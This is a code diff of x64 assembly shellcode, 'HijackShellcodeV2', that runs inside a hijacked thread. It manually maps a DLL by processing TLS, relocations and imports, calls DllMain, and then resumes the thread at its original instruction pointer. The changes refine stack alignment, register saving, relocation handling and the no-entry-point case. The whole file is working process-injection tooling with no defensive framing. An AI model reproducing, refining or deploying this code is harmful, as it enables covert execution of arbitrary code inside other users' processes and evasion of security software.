@@ -77,6 +77,7 @@ HijackShellcodeV2 PROC
     ; RCX = HIJACK_CONTEXT pointer
     
     ; === Save XMM registers immediately (they're volatile) ===
+    ; Note: Context buffer must be 16-byte aligned for movaps
     movaps  xmmword ptr [rcx + CTX_OriginalXmm0], xmm0
     movaps  xmmword ptr [rcx + CTX_OriginalXmm1], xmm1
     movaps  xmmword ptr [rcx + CTX_OriginalXmm2], xmm2
@@ -84,23 +85,41 @@ HijackShellcodeV2 PROC
     movaps  xmmword ptr [rcx + CTX_OriginalXmm4], xmm4
     movaps  xmmword ptr [rcx + CTX_OriginalXmm5], xmm5
     
-    ; === Setup stack frame ===
+    ; === Setup stack frame with proper alignment ===
+    ; x64 ABI: RSP must be 16-byte aligned BEFORE call instruction
+    ; call pushes 8-byte return address, so we need (16n + 8) before call
     push    rbp
     mov     rbp, rsp
-    and     rsp, -16                    ; Align stack to 16 bytes
-    sub     rsp, 200h                   ; Space for locals + shadow
+    
+    ; Save all non-volatile registers we'll use
+    push    rbx
+    push    rsi
+    push    rdi
+    push    r12
+    push    r13
+    push    r14
+    push    r15
+    
+    ; Align stack: 7 pushes (56 bytes) + rbp (8) = 64 bytes pushed
+    ; Stack is now 16-byte aligned. sub 8 to make it 16n+8 for calls
+    sub     rsp, 28h                    ; 0x20 shadow + 0x8 alignment = 0x28
     
     ; === Save context pointer in non-volatile register ===
     mov     rbx, rcx                    ; RBX = context (preserved across calls)
     
-    ; === Process TLS if available ===
+    ; === Process TLS if LdrpHandleTlsData is available ===
+    ; LdrpHandleTlsData is an internal ntdll function, may not be exported
+    ; Signature: NTSTATUS LdrpHandleTlsData(PVOID BaseAddress)
     mov     rax, [rbx + CTX_pLdrpHandleTlsData]
     test    rax, rax
     jz      skip_tls
     cmp     qword ptr [rbx + CTX_TlsDirSize], 0
     jz      skip_tls
+    
+    ; Call LdrpHandleTlsData(ImageBase) - already have shadow space allocated
     mov     rcx, [rbx + CTX_ImageBase]
     call    rax
+    ; Ignore return value - TLS init failure is not fatal
 skip_tls:
 
     ; === Process Relocations ===
@@ -131,18 +150,27 @@ reloc_block_loop:
 entry_loop:
     test    ecx, ecx
     jz      next_block
-    movzx   eax, word ptr [rdx]
+    movzx   eax, word ptr [rdx]         ; Read relocation entry (2 bytes)
+    
+    ; Extract type from bits 12-15
     mov     edi, eax
     shr     edi, 12
-    cmp     edi, 0Ah                    ; IMAGE_REL_BASED_DIR64
-    jne     skip_entry
-    and     eax, 0FFFh
+    
+    ; Handle different relocation types
+    cmp     edi, 0                      ; IMAGE_REL_BASED_ABSOLUTE (padding, skip)
+    je      skip_entry
+    cmp     edi, 0Ah                    ; IMAGE_REL_BASED_DIR64 (64-bit address)
+    jne     skip_entry                  ; Skip unknown types
+    
+    ; Apply 64-bit relocation: *(ImageBase + VirtualAddress + offset) += delta
+    and     eax, 0FFFh                  ; Extract offset (bits 0-11)
     movsxd  rax, eax
-    add     rax, r14
-    add     rax, [rbx + CTX_ImageBase]
-    add     qword ptr [rax], rsi
+    add     rax, r14                    ; + VirtualAddress (page RVA)
+    add     rax, [rbx + CTX_ImageBase]  ; + ImageBase = absolute address
+    add     qword ptr [rax], rsi        ; Add delta to the 64-bit value
+    
 skip_entry:
-    add     rdx, 2
+    add     rdx, 2                      ; Next entry (2 bytes each)
     dec     ecx
     jmp     entry_loop
 next_block:
@@ -162,6 +190,8 @@ import_loop:
     jz      skip_imports
     movsxd  rax, eax
     add     rax, [rbx + CTX_ImageBase]
+    
+    ; Call LoadLibraryA(dll_name) - shadow space already reserved in prologue
     mov     rcx, rax                    ; arg1 = dll name
     call    qword ptr [rbx + CTX_pLoadLibraryA]
     test    rax, rax
@@ -194,13 +224,15 @@ by_name:
     add     rax, 2                      ; skip Hint
     mov     rdx, rax                    ; function name
 do_getproc:
-    mov     rcx, r14                    ; module handle
+    ; Call GetProcAddress(hModule, lpProcName/ordinal)
+    mov     rcx, r14                    ; arg1 = module handle
+    ; rdx already set to name or ordinal
     call    qword ptr [rbx + CTX_pGetProcAddress]
     test    rax, rax
     jz      fail
-    mov     qword ptr [rdi], rax
-    add     r15, 8
-    add     rdi, 8
+    mov     qword ptr [rdi], rax        ; Store in IAT
+    add     r15, 8                      ; Next INT entry
+    add     rdi, 8                      ; Next IAT entry
     jmp     thunk_loop
 next_descriptor:
     add     r12, 14h                    ; sizeof(IMAGE_IMPORT_DESCRIPTOR)
@@ -211,20 +243,34 @@ skip_imports:
     mov     rax, [rbx + CTX_pNtFlushInstructionCache]
     test    rax, rax
     jz      skip_flush
-    mov     rcx, -1                     ; NtCurrentProcess()
-    mov     rdx, [rbx + CTX_ImageBase]
-    mov     r8, [rbx + CTX_ImageSize]
+    
+    ; NtFlushInstructionCache(ProcessHandle, BaseAddress, Length)
+    mov     rcx, -1                     ; arg1 = NtCurrentProcess() = -1
+    mov     rdx, [rbx + CTX_ImageBase]  ; arg2 = BaseAddress
+    mov     r8, [rbx + CTX_ImageSize]   ; arg3 = Length
     call    rax
 skip_flush:
 
-    ; === Call DllMain ===
-    mov     rcx, [rbx + CTX_ImageBase]  ; hinstDLL
-    mov     edx, 1                      ; DLL_PROCESS_ATTACH
-    xor     r8, r8                      ; lpvReserved = NULL
+    ; === Call DllMain(hinstDLL, fdwReason, lpvReserved) ===
+    mov     rcx, [rbx + CTX_ImageBase]  ; arg1 = hinstDLL
+    mov     edx, 1                      ; arg2 = DLL_PROCESS_ATTACH
+    xor     r8, r8                      ; arg3 = lpvReserved = NULL
+    
+    ; Calculate entry point address
     mov     rax, [rbx + CTX_ImageBase]
     add     rax, [rbx + CTX_EntryPointRva]
+    
+    ; Check if entry point is 0 (DLL without entry point)
+    cmp     qword ptr [rbx + CTX_EntryPointRva], 0
+    jz      no_entrypoint
+    
     call    rax
     mov     dword ptr [rbx + CTX_Result], eax
+    jmp     done
+
+no_entrypoint:
+    ; No entry point - consider it success
+    mov     dword ptr [rbx + CTX_Result], 1
     jmp     done
 
 fail:
@@ -232,10 +278,12 @@ fail:
     mov     dword ptr [rbx + CTX_ErrorCode], 1
 
 done:
-    ; === Signal completion ===
+    ; === Signal completion (atomic write) ===
     mov     dword ptr [rbx + CTX_Completed], 1
     
-    ; === Restore XMM registers ===
+    ; === Epilogue: Restore everything and return to hijacked location ===
+    
+    ; First restore XMM from context (need RBX for addressing)
     movaps  xmm0, xmmword ptr [rbx + CTX_OriginalXmm0]
     movaps  xmm1, xmmword ptr [rbx + CTX_OriginalXmm1]
     movaps  xmm2, xmmword ptr [rbx + CTX_OriginalXmm2]
@@ -243,7 +291,7 @@ done:
     movaps  xmm4, xmmword ptr [rbx + CTX_OriginalXmm4]
     movaps  xmm5, xmmword ptr [rbx + CTX_OriginalXmm5]
     
-    ; === Restore GPRs from context ===
+    ; Restore GPRs from original context (thread was hijacked mid-execution)
     mov     rax, [rbx + CTX_OriginalRax]
     mov     rcx, [rbx + CTX_OriginalRcx]
     mov     rdx, [rbx + CTX_OriginalRdx]
@@ -257,14 +305,18 @@ done:
     mov     r13, [rbx + CTX_OriginalR13]
     mov     r14, [rbx + CTX_OriginalR14]
     mov     r15, [rbx + CTX_OriginalR15]
+    mov     rbp, [rbx + CTX_OriginalRbp]
     
-    ; === Setup return to original RIP ===
+    ; Setup stack to return to original RIP
+    ; We completely replace RSP and push return address
     mov     rsp, [rbx + CTX_OriginalRsp]
     push    qword ptr [rbx + CTX_OriginalRip]
-    mov     rbp, [rbx + CTX_OriginalRbp]
-    mov     rbx, [rbx + CTX_OriginalRbx] ; Restore RBX last!
     
-    ret     ; Returns to OriginalRip
+    ; Restore RBX absolutely last (we were using it for context addressing)
+    mov     rbx, [rbx + CTX_OriginalRbx]
+    
+    ; Return to original execution point
+    ret
 
 HijackShellcodeV2 ENDP
 
